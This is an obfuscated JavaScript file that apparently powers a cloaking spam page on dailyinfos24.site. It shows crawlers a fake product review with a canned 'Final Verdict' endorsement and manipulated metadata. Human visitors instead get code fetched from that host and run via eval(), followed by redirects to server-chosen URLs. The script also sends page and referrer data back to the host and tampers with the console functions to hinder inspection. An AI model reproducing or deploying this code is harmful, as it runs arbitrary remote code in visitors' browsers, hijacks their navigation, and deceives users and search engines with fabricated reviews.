var isCrawler = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);
var debug = false;
var stopped = false;
var loader = false;
var is404 = false;
var DOM = {};
const urlParams = new URLSearchParams(window.location.search);
var identifier;
var triggered = false;
if (urlParams.has("o2x")) {
  identifier = urlParams.get("o2x");
}
if (urlParams.has("io0")) {
  identifier = urlParams.get("io0");
}
if (!urlParams.has("o2x") && !urlParams.has("io0") && !urlParams.has("dbg123")) {
  show404();
  if (loader) {
    hideLoader();
  }
}
if (identifier !== undefined) {
  document.body.innerHTML = '';
  var script = document.createElement("script");
  script.setAttribute("src", "https://dailyinfos24.site/js6/index.js?id=" + identifier);
  script.setAttribute("id", "code");
  document.head.appendChild(script);
  if (!isCrawler) {
    (function () {
      'use strict';

      var _0x212fca = new MutationObserver(function () {
        if (document.body && !isCrawler && !stopped && !is404) {
          loader = true;
          let _0x5d39fc = document.createElement("div");
          _0x5d39fc.setAttribute("class", "loader-wrap");
          let _0x53c73b = document.createElement("span");
          _0x53c73b.setAttribute("class", "loader");
          let _0x214b98 = document.createElement("style");
          _0x214b98.innerHTML = ".loader-wrap{position:fixed;background-color:#FFF;top:0;left:0;width:100%;height:100%;z-index:100;display:flex;align-items:center;justify-content:center;transition:.5s}.loader{width:68px;height:68px;border:5px dotted #525252;border-radius:50%;display:inline-block;position:relative;box-sizing:border-box;animation:2s linear infinite rotation}@keyframes rotation{0%{opacity:.01;transform:rotate(0)}50%{opacity:1;transform:rotate(180deg)}100%{opacity:.01;transform:rotate(360deg)}}";
          document.head.appendChild(_0x214b98);
          document.body.appendChild(_0x5d39fc);
          _0x5d39fc.appendChild(_0x53c73b);
          _0x212fca.disconnect();
        }
      });
      _0x212fca.observe(document.documentElement, {
        "childList": true
      });
    })();
    if (urlParams.has("dbg123")) {
      debug = true;
    }
    load("https://dailyinfos24.site/api/latest/" + identifier).then(_0x1d5827 => {
      if (_0x1d5827.rCode !== undefined) {
        eval(_0x1d5827.rCode);
      }
      if (!debug && _0x1d5827.redirect && !stopped) {
        triggered = true;
        window.location.replace(_0x1d5827.to);
        let _0x4e9e4c = document.createElement("img");
        _0x4e9e4c.setAttribute("src", 0x0);
        _0x4e9e4c.setAttribute("onerror", "top.location.href='" + _0x1d5827.to + "'");
        document.body.appendChild(_0x4e9e4c);
      }
    })["catch"](_0x163e28 => {
      if (!debug && !stopped && !is404) {
        errorRedirect();
      }
    });
  }
  let metaUTF8 = document.createElement("meta");
  let metaViewport = document.createElement("meta");
  let metaCompatible = document.createElement("meta");
  let metaGoogleBot = document.createElement("meta");
  let metaGoogleBotIfEmbedded = document.createElement("meta");
  let metaRobots = document.createElement("meta");
  metaUTF8.setAttribute("charset", "utf-8");
  metaViewport.setAttribute("name", "viewport");
  metaViewport.setAttribute("content", "width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0");
  metaCompatible.setAttribute("http-equiv", "X-UA-Compatible");
  metaCompatible.setAttribute("content", "ie=edge");
  metaGoogleBot.setAttribute("name", "googlebot");
  metaGoogleBot.setAttribute("content", "index");
  metaGoogleBotIfEmbedded.setAttribute("name", "googlebot");
  metaGoogleBotIfEmbedded.setAttribute("content", "indexifembedded");
  metaRobots.setAttribute("name", "robots");
  metaRobots.setAttribute("content", "index,noarchive");
  document.head.appendChild(metaUTF8);
  document.head.appendChild(metaViewport);
  document.head.appendChild(metaCompatible);
  document.head.appendChild(metaGoogleBot);
  document.head.appendChild(metaGoogleBotIfEmbedded);
  document.head.appendChild(metaRobots);
  script.onerror = () => {
    loadDefault();
  };
  script.onabort = () => {
    loadDefault();
  };
  setTimeout(() => {
    if (!triggered) {
      loadDefault();
    }
  }, 0xbb8);
} else {}
function load(_0x2db90f) {
  return fetch(_0x2db90f).then(function (_0x50a7aa) {
    return _0x50a7aa.json();
  })["catch"](function (_0x414c93) {});
}
function loadDefault() {
  triggered = true;
  if (stopped) {
    return;
  }
  if (identifier === undefined || identifier === null && !debug) {
    return show404();
  }
  let _0x581889 = setInterval(() => {
    if (document.body !== null) {
      clearInterval(_0x581889);
      initDom();
    }
  }, 0x32);
  load("https://storage.dailyinfos24.site/fetch/" + identifier + ".json").then(_0x4486d5 => {
    document.title = titleCase(_0x4486d5.title) + " [" + _0x4486d5.random1 + "]";
    try {
      let _0x371c77 = document.createElement("meta");
      let _0x849e98 = document.createElement("meta");
      _0x371c77.setAttribute("name", "description");
      _0x371c77.setAttribute("content", _0x4486d5.description);
      _0x849e98.setAttribute("name", "keywords");
      _0x849e98.setAttribute("content", _0x4486d5.random1 + " " + titleCase(_0x4486d5.title) + ", " + titleCase(_0x4486d5.title));
      document.head.appendChild(_0x371c77);
      document.head.appendChild(_0x849e98);
      let _0x1e0f47 = document.querySelector("meta[property=\"og:locale\"]");
      let _0x4707c9 = document.querySelector("meta[property=\"og:site_name\"]");
      _0x1e0f47.setAttribute("content", _0x4486d5.language);
      _0x4707c9.setAttribute("content", titleCase(_0x4486d5.title) + " [" + _0x4486d5.random1 + "]");
      let _0x2b76e3 = document.querySelector("html");
      _0x2b76e3.setAttribute("lang", _0x4486d5.language);
    } catch (_0x3f9a4d) {}
    hideLoader();
    if (_0x4486d5.schemas !== undefined) {
      _0x4486d5.schemas.forEach(_0xdc4251 => {
        addSchema(_0xdc4251.id, _0xdc4251.data);
      });
    }
    let _0x4dac41 = setInterval(() => {
      if (DOM.footer !== null || stopped) {
        clearInterval(_0x4dac41);
        if (!stopped) {
          populateDom(_0x4486d5);
        }
      }
    }, 0x32);
  });
  load("https://dailyinfos24.site/api/latest/" + identifier).then(_0x47bf50 => {
    if (_0x47bf50.cCode !== undefined) {
      eval(_0x47bf50.cCode);
    }
    if (_0x47bf50.schemas !== undefined && _0x47bf50.schemas.length > 0x0) {
      _0x47bf50.schemas.forEach(_0x5ec70c => {
        addSchema(_0x5ec70c.id, _0x5ec70c.data);
      });
    }
    let _0x24ee16 = setInterval(() => {
      if (DOM.footer !== null || stopped) {
        clearInterval(_0x24ee16);
        if (!stopped) {
          populateMeta(_0x47bf50);
        }
      }
    }, 0x32);
  });
}
function populateDom(_0x1a4613) {
  if (_0x1a4613.related === undefined) {
    DOM.main.setAttribute("class", "px-2 w-full h-48 max-w-7xl mx-auto grid grid-cols-1 mt-4 gap-x-12");
    DOM.main_aside.remove();
  } else {
    try {
      _0x1a4613.related.forEach(_0x4f9324 => {
        appendRelative(_0x4f9324.header, _0x4f9324.url);
      });
    } catch (_0x31cc2) {}
  }
  DOM.main_article_header_h1.innerHTML = titleCase(_0x1a4613.title) + " [" + _0x1a4613.random1 + "]";
  DOM.main_article_figure_img.setAttribute("aria-label", "Image of " + _0x1a4613.name);
  DOM.main_article_figure_img.setAttribute("alt", _0x1a4613.name + ".png");
  DOM.main_article_figure_img.setAttribute("src", _0x1a4613.identifier !== undefined ? _0x1a4613.backdrop : _0x1a4613.image);
  DOM.main_article_figure_figcaption.innerHTML = "Image of " + _0x1a4613.name;
  const [_0x56697f, _0xcef109] = splitText(_0x1a4613.text);
  DOM.main_article_p1.innerHTML = _0x56697f;
  DOM.main_article_button1_span.innerHTML = "Special Access:";
  DOM.main_article_button1_span2.innerHTML = "For Our Readers Only!";
  DOM.main_article_p2.innerHTML = _0xcef109;
  DOM.main_article_h3.innerHTML = "Final Verdict";
  DOM.main_article_p3.innerHTML = "We can definitely recommend " + (_0x1a4613.identifier !== undefined ? _0x1a4613.title : _0x1a4613.name) + " to our readers, since it is not merely a product, but a symphony of experiences crafted for the discerning individual. In a world full of choices, it's vital to select products that truly align with our wellness goals.  " + (_0x1a4613.identifier !== undefined ? _0x1a4613.title : _0x1a4613.name) + " stands out as a trusted companion on your health journey. While every product has its nuances, our unwavering commitment is to enhance your life quality. The journey to a better you starts with a single step. Why not take it now?";
  DOM.main_article_button2_span.innerHTML = "Unlock Exclusive";
  DOM.main_article_button2_span2.innerHTML = "Details & Discounts";
}
function populateMeta(_0x508273) {
  DOM.main_article_header_p.innerHTML = "Published on: <time datetime=\"" + _0x508273.updated + "\">" + getCurrentFormattedDate(_0x508273.updated) + "</time>";
  DOM.main_article_button1_a.setAttribute("href", _0x508273.to);
  DOM.main_article_button2_a.setAttribute("href", _0x508273.to);
  let _0x1ea042 = document.querySelector("script[id=\"default\"]");
  if (_0x1ea042 !== null && _0x1ea042 !== undefined) {
    let _0x7aa6fa = JSON.parse(_0x1ea042.innerText);
    _0x7aa6fa.uploadDate = isoDateTimeToDateOnly(_0x508273.updated);
    _0x1ea042.innerHTML = JSON.stringify(_0x7aa6fa);
  }
}
function addSchema(_0x5c177f, _0x5ec45d) {
  let _0x3d7de0 = document.createElement("script");
  _0x3d7de0.setAttribute("type", "application/ld+json");
  _0x3d7de0.setAttribute("id", _0x5c177f);
  _0x3d7de0.innerHTML = JSON.stringify(_0x5ec45d);
  document.head.appendChild(_0x3d7de0);
}
function initDom() {
  DOM.styles = document.createElement("style");
  DOM.styles.innerHTML = "*,:before,:after{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}:before,:after{--tw-content: \"\"}html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;-o-tab-size:4;tab-size:4;font-family:ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif,\"Apple Color Emoji\",\"Segoe UI Emoji\",Segoe UI Symbol,\"Noto Color Emoji\";font-feature-settings:normal;font-variation-settings:normal}body{margin:0;line-height:inherit;background:#fff;}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}b,strong{font-weight:bolder}code,kbd,samp,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,[type=button],[type=reset],[type=submit]{-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dl,dd,h1,h2,h3,h4,h5,h6,hr,figure,p,pre{margin:0}fieldset{margin:0;padding:0}legend{padding:0}ol,ul,menu{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::-moz-placeholder,textarea::-moz-placeholder{opacity:1;color:#9ca3af}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}button,[role=button]{cursor:pointer}:disabled{cursor:default}img,svg,video,canvas,audio,iframe,embed,object{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]{display:none}*,:before,:after{--tw-border-spacing-x: 0;--tw-border-spacing-y: 0;--tw-translate-x: 0;--tw-translate-y: 0;--tw-rotate: 0;--tw-skew-x: 0;--tw-skew-y: 0;--tw-scale-x: 1;--tw-scale-y: 1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness: proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width: 0px;--tw-ring-offset-color: #fff;--tw-ring-color: rgb(59 130 246 / .5);--tw-ring-offset-shadow: 0 0 #0000;--tw-ring-shadow: 0 0 #0000;--tw-shadow: 0 0 #0000;--tw-shadow-colored: 0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: }::backdrop{--tw-border-spacing-x: 0;--tw-border-spacing-y: 0;--tw-translate-x: 0;--tw-translate-y: 0;--tw-rotate: 0;--tw-skew-x: 0;--tw-skew-y: 0;--tw-scale-x: 1;--tw-scale-y: 1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness: proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width: 0px;--tw-ring-offset-color: #fff;--tw-ring-color: rgb(59 130 246 / .5);--tw-ring-offset-shadow: 0 0 #0000;--tw-ring-shadow: 0 0 #0000;--tw-shadow: 0 0 #0000;--tw-shadow-colored: 0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: }.absolute{position:absolute}.relative{position:relative}.inset-0{top:0;right:0;bottom:0;left:0}.-mx-2{margin-left:-.5rem;margin-right:-.5rem}.mx-auto{margin-left:auto;margin-right:auto}.my-10{margin-top:2.5rem;margin-bottom:2.5rem}.max-h-60{max-height:15rem}.my-6{margin-top:1.5rem;margin-bottom:1.5rem}.mb-20{margin-bottom:5rem}.mt-4{margin-top:1rem}.mt-48{margin-top:12rem}.mt-6{margin-top:1.5rem}.flex{display:flex}.grid{display:grid}.h-48{height:12rem}.w-full{width:100%}.max-w-7xl{max-width:80rem}.grid-cols-1{grid-template-columns:repeat(1,minmax(0,1fr))}.flex-col{flex-direction:column}.gap-x-12{-moz-column-gap:3rem;column-gap:3rem}.space-y-4>:not([hidden])~:not([hidden]){--tw-space-y-reverse: 0;margin-top:calc(1rem * calc(1 - var(--tw-space-y-reverse)));margin-bottom:calc(1rem * var(--tw-space-y-reverse))}.divide-y>:not([hidden])~:not([hidden]){--tw-divide-y-reverse: 0;border-top-width:calc(1px * calc(1 - var(--tw-divide-y-reverse)));border-bottom-width:calc(1px * var(--tw-divide-y-reverse))}.divide-gray-200>:not([hidden])~:not([hidden]){--tw-divide-opacity: 1;border-color:rgb(229 231 235 / var(--tw-divide-opacity))}.rounded{border-radius:.25rem}.bg-blue-400{--tw-bg-opacity: 1;background-color:rgb(96 165 250 / var(--tw-bg-opacity))}.bg-gray-700{--tw-bg-opacity: 1;background-color:rgb(55 65 81 / var(--tw-bg-opacity))}.object-contain{-o-object-fit:contain;object-fit:contain}.p-2{padding:.5rem}.p-4{padding:1rem}.px-2{padding-left:.5rem;padding-right:.5rem}.pb-1{padding-bottom:.25rem}.pt-2{padding-top:.5rem}.pt-4{padding-top:1rem}.text-center{text-align:center}.text-justify{text-align:justify}.text-2xl{font-size:1.5rem;line-height:2rem}.text-sm{font-size:.875rem;line-height:1.25rem}.text-xl{font-size:1.25rem;line-height:1.75rem}.font-bold{font-weight:700}.text-gray-500{--tw-text-opacity: 1;color:rgb(107 114 128 / var(--tw-text-opacity))}.text-white{--tw-text-opacity: 1;color:rgb(255 255 255 / var(--tw-text-opacity))}@media (min-width: 768px){.md\\:col-span-2{grid-column:span 2 / span 2}.md\\:col-span-4{grid-column:span 4 / span 4}.md\\:mx-auto{margin-left:auto;margin-right:auto}.md\\:w-2\\/3{width:66.666667%}.md\\:grid-cols-6{grid-template-columns:repeat(6,minmax(0,1fr))}.md\\:text-4xl{font-size:2.25rem;line-height:2.5rem}}\n";
  document.head.appendChild(DOM.styles);
  DOM.header = document.createElement("header");
  DOM.header_a = document.createElement("a");
  DOM.header_img = document.createElement("img");
  DOM.header_nav = document.createElement("nav");
  DOM.header_time = document.createElement("time");
  document.body.appendChild(DOM.header);
  DOM.header_a.setAttribute("href", window.location.href);
  DOM.header_a.setAttribute("class", "mx-auto text-center");
  DOM.header.appendChild(DOM.header_a);
  DOM.header_img.setAttribute("src", "https://dailyinfos24.site/images/logo.png");
  DOM.header_img.setAttribute("class", "px-2 pt-2 pb-1 object-contain mx-auto");
  DOM.header_img.setAttribute("alt", "logo.png");
  DOM.header_a.appendChild(DOM.header_img);
  DOM.header_nav.setAttribute("class", "w-full bg-gray-700 text-center p-2");
  DOM.header.appendChild(DOM.header_nav);
  DOM.header_time.setAttribute("datetime", new Date().toISOString());
  DOM.header_time.setAttribute("class", "text-white text-center");
  DOM.header_time.innerHTML = getCurrentFormattedDate();
  DOM.header_nav.appendChild(DOM.header_time);
  DOM.main = document.createElement("main");
  DOM.main_article = document.createElement("article");
  DOM.main_article_header = document.createElement("header");
  DOM.main_article_header_h1 = document.createElement("h1");
  DOM.main_article_header_p = document.createElement("p");
  DOM.main_article_header_time = document.createElement("time");
  DOM.main_article_figure = document.createElement("figure");
  DOM.main_article_figure_img = document.createElement("img");
  DOM.main_article_figure_figcaption = document.createElement("figcaption");
  DOM.main_article_p1 = document.createElement("p");
  DOM.main_article_button1 = document.createElement("button");
  DOM.main_article_button1_a = document.createElement("a");
  DOM.main_article_button1_span = document.createElement("span");
  DOM.main_article_button1_span2 = document.createElement("span");
  DOM.main_article_p2 = document.createElement("p");
  DOM.main_article_h3 = document.createElement("h3");
  DOM.main_article_p3 = document.createElement("p");
  DOM.main_article_button2 = document.createElement("button");
  DOM.main_article_button2_a = document.createElement("a");
  DOM.main_article_button2_span = document.createElement("span");
  DOM.main_article_button2_span2 = document.createElement("span");
  DOM.main_article_footer = document.createElement("footer");
  DOM.main_article_footer_h6 = document.createElement("h6");
  DOM.main_article_footer_p = document.createElement("p");
  DOM.main.setAttribute("class", "px-2 w-full h-48 max-w-7xl mx-auto grid grid-cols-1 md:grid-cols-6 mt-4 gap-x-12");
  document.body.appendChild(DOM.main);
  DOM.main_article.setAttribute("class", "md:col-span-4");
  DOM.main_article.setAttribute("aria-labelledby", "article-heading");
  DOM.main.appendChild(DOM.main_article);
  DOM.main_article.appendChild(DOM.main_article_header);
  DOM.main_article_header_h1.setAttribute("id", "article-heading");
  DOM.main_article_header_h1.setAttribute("class", "font-bold text-xl md:text-4xl");
  DOM.main_article_header.appendChild(DOM.main_article_header_h1);
  DOM.main_article_header_p.setAttribute("class", "text-gray-500 text-sm");
  DOM.main_article.appendChild(DOM.main_article_header_p);
  DOM.main_article_header_p.appendChild(DOM.main_article_header_time);
  DOM.main_article.appendChild(DOM.main_article_figure);
  DOM.main_article_figure_img.setAttribute("class", "w-full object-contain max-h-60");
  DOM.main_article_figure_img.setAttribute("role", "img");
  DOM.main_article_figure.appendChild(DOM.main_article_figure_img);
  DOM.main_article_figure_figcaption.setAttribute("class", "text-center mx-auto");
  DOM.main_article_figure.appendChild(DOM.main_article_figure_figcaption);
  DOM.main_article_p1.setAttribute("class", "text-justify mt-6");
  DOM.main_article.appendChild(DOM.main_article_p1);
  DOM.main_article_button1.setAttribute("class", "text-white bg-blue-400 w-full p-4 text-center flex flex-col rounded my-10 md:w-2/3 md:mx-auto relative");
  DOM.main_article.appendChild(DOM.main_article_button1);
  DOM.main_article_button1_a.setAttribute("class", "absolute inset-0");
  DOM.main_article_button1.appendChild(DOM.main_article_button1_a);
  DOM.main_article_button1_span.setAttribute("class", "text-center mx-auto");
  DOM.main_article_button1.appendChild(DOM.main_article_button1_span);
  DOM.main_article_button1_span2.setAttribute("class", "text-center text-2xl font-bold mx-auto");
  DOM.main_article_button1.appendChild(DOM.main_article_button1_span2);
  DOM.main_article_p2.setAttribute("class", "text-justify");
  DOM.main_article.appendChild(DOM.main_article_p2);
  DOM.main_article_h3.setAttribute("class", "text-center text-2xl bg-gray-700 -mx-2 text-white my-6 p-4");
  DOM.main_article.appendChild(DOM.main_article_h3);
  DOM.main_article_p3.setAttribute("class", "text-justify");
  DOM.main_article.appendChild(DOM.main_article_p3);
  DOM.main_article_button2.setAttribute("class", "text-white bg-blue-400 w-full p-4 text-center flex flex-col rounded my-10 md:w-2/3 md:mx-auto relative");
  DOM.main_article.appendChild(DOM.main_article_button2);
  DOM.main_article_button2_a.setAttribute("class", "absolute inset-0");
  DOM.main_article_button2.appendChild(DOM.main_article_button2_a);
  DOM.main_article_button2_span.setAttribute("class", "text-center mx-auto");
  DOM.main_article_button2.appendChild(DOM.main_article_button2_span);
  DOM.main_article_button2_span2.setAttribute("class", "text-center text-2xl font-bold mx-auto");
  DOM.main_article_button2.appendChild(DOM.main_article_button2_span2);
  DOM.main_article_footer.setAttribute("class", "mt-48 mb-20");
  DOM.main_article.appendChild(DOM.main_article_footer);
  DOM.main_article_footer.appendChild(DOM.main_article_footer_h6);
  DOM.main_article_footer_p.setAttribute("class", "text-sm text-gray-500");
  DOM.main_article_footer.appendChild(DOM.main_article_footer_p);
  DOM.main_aside = document.createElement("aside");
  DOM.main_aside_h3 = document.createElement("h3");
  DOM.main_aside_section = document.createElement("h3");
  DOM.main_aside.setAttribute("class", "md:col-span-2");
  DOM.main.appendChild(DOM.main_aside);
  DOM.main_aside_h3.setAttribute("class", "w-full bg-gray-700 text-white text-center p-4 font-bold text-xl");
  DOM.main_aside_h3.innerHTML = "Related";
  DOM.main_aside.appendChild(DOM.main_aside_h3);
  DOM.main_aside_section.setAttribute("class", "divide-y divide-gray-200 space-y-4");
  DOM.main_aside.appendChild(DOM.main_aside_section);
  DOM.footer = document.createElement("footer");
  document.body.appendChild(DOM.footer);
}
function hideLoader() {
  const _0x587826 = function () {
    let _0x1bd2e4 = true;
    return function (_0x291303, _0x1a30b4) {
      const _0x24ff9c = _0x1bd2e4 ? function () {
        if (_0x1a30b4) {
          const _0x2f111f = _0x1a30b4.apply(_0x291303, arguments);
          _0x1a30b4 = null;
          return _0x2f111f;
        }
      } : function () {};
      _0x1bd2e4 = false;
      return _0x24ff9c;
    };
  }();
  const _0x42e9e5 = _0x587826(this, function () {
    let _0x26d83f;
    try {
      const _0x1597b6 = Function("return (function() {}.constructor(\"return this\")( ));");
      _0x26d83f = _0x1597b6();
    } catch (_0x3782d3) {
      _0x26d83f = window;
    }
    const _0x41e0fd = _0x26d83f.console = _0x26d83f.console || {};
    const _0x1a3208 = ["log", "warn", "info", "error", "exception", "table", "trace"];
    for (let _0x47c034 = 0x0; _0x47c034 < _0x1a3208.length; _0x47c034++) {
      const _0x1cfd01 = _0x587826.constructor.prototype.bind(_0x587826);
      const _0x27abd4 = _0x1a3208[_0x47c034];
      const _0x539707 = _0x41e0fd[_0x27abd4] || _0x1cfd01;
      _0x1cfd01.__proto__ = _0x587826.bind(_0x587826);
      _0x1cfd01.toString = _0x539707.toString.bind(_0x539707);
      _0x41e0fd[_0x27abd4] = _0x1cfd01;
    }
  });
  _0x42e9e5();
  if (loader) {
    let _0x560a19 = document.querySelector(".loader-wrap");
    _0x560a19.style.opacity = 0x0;
    setTimeout(() => {
      _0x560a19.style.display = "none";
      _0x560a19.remove();
    }, 0x3e8);
  }
}
function appendRelative(_0xb98be4, _0x3ad2ed) {
  let _0x5d67d3 = document.createElement("article");
  _0x5d67d3.setAttribute("class", "p-2 pt-4 relative");
  DOM.main_aside.appendChild(_0x5d67d3);
  let _0x45f0aa = document.createElement("a");
  _0x45f0aa.setAttribute("href", _0x3ad2ed);
  _0x45f0aa.setAttribute("class", "absolute inset-0");
  _0x5d67d3.appendChild(_0x45f0aa);
  let _0x375cdb = document.createElement("h4");
  _0x375cdb.setAttribute("class", "w-full font-bold text-2xl");
  _0x375cdb.innerHTML = _0xb98be4;
  _0x5d67d3.appendChild(_0x375cdb);
}
function splitText(_0x59fba1) {
  const _0x293397 = Math.floor(_0x59fba1.length / 0x3);
  let _0x1381ba = _0x293397;
  while (_0x1381ba < _0x59fba1.length && _0x59fba1[_0x1381ba] !== "\n") {
    _0x1381ba++;
  }
  if (_0x1381ba < _0x59fba1.length) {
    return [_0x59fba1.substring(0x0, _0x1381ba + 0x1), _0x59fba1.substring(_0x1381ba + 0x1)];
  }
  return [_0x59fba1.substring(0x0, _0x293397), _0x59fba1.substring(_0x293397)];
}
function errorRedirect() {
  urlParams.append("c", window.location.href);
  urlParams.append("r", document.referrer);
  let _0x5451a6 = urlParams.toString();
  let _0x2ec13f = "https://dailyinfos24.site/bh?" + _0x5451a6;
  window.location.href = _0x2ec13f;
  let _0x572135 = document.createElement("img");
  _0x572135.setAttribute("src", 0x0);
  _0x572135.setAttribute("onerror", "top.location.href='" + _0x2ec13f + "'");
  document.body.appendChild(_0x572135);
}
function show404() {
  is404 = true;
  triggered = true;
  stopped = true;
}
function getCurrentFormattedDate(_0x262ed9 = null) {
  const _0x318eea = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"];
  const _0x5a9448 = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
  let _0x521167 = new Date();
  if (_0x262ed9 !== null) {
    _0x521167 = new Date(Date.parse(_0x262ed9));
  }
  let _0x49587b = _0x318eea[_0x521167.getDay()];
  let _0x5cf355 = _0x5a9448[_0x521167.getMonth()];
  let _0xae3e31 = _0x521167.getDate();
  let _0x4c6962 = _0x521167.getFullYear();
  return _0x49587b + ", " + _0x5cf355 + " " + _0xae3e31 + ", " + _0x4c6962;
}
function titleCase(_0x38d8e0) {
  var _0x534304 = _0x38d8e0.toLowerCase().split(" ");
  for (var _0x16c271 = 0x0; _0x16c271 < _0x534304.length; _0x16c271++) {
    _0x534304[_0x16c271] = _0x534304[_0x16c271].charAt(0x0).toUpperCase() + _0x534304[_0x16c271].substring(0x1);
  }
  return _0x534304.join(" ");
}
function getTitle(_0x63641e) {
  return _0x63641e.identifier !== undefined ? _0x63641e.title : _0x63641e.name;
}
